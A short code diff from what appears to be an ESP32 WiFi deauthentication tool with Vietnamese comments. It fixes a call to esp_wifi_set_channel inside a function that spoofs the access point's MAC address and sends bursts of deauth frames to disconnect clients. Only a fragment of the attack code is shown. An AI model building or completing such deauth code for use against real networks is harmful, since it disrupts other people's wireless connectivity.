@@ -24,13 +24,14 @@ struct Network {
 Network networks[20]; // Giới hạn 20 mạng để tránh tràn bộ nhớ
 int networkCount = 0;
 
-// Hàm gửi gói tin deauth
+// Hàm gửi gói tin deauth (đã sửa để dùng hai tham số)
 void sendDeauthFrame(uint8_t* apMac, uint8_t* stationMac, uint8_t channel) {
   memcpy(&deauthFrame[4], stationMac, 6);  // MAC đích
   memcpy(&deauthFrame[10], apMac, 6);      // MAC nguồn
   memcpy(&deauthFrame[16], apMac, 6);      // BSSID
 
-  esp_wifi_set_channel(channel);
+  // Đặt kênh WiFi với tham số thứ hai là WIFI_SECOND_CHAN_NONE
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
   // Gửi 10 gói tin deauth
   for (int i = 0; i < 10; i++) {
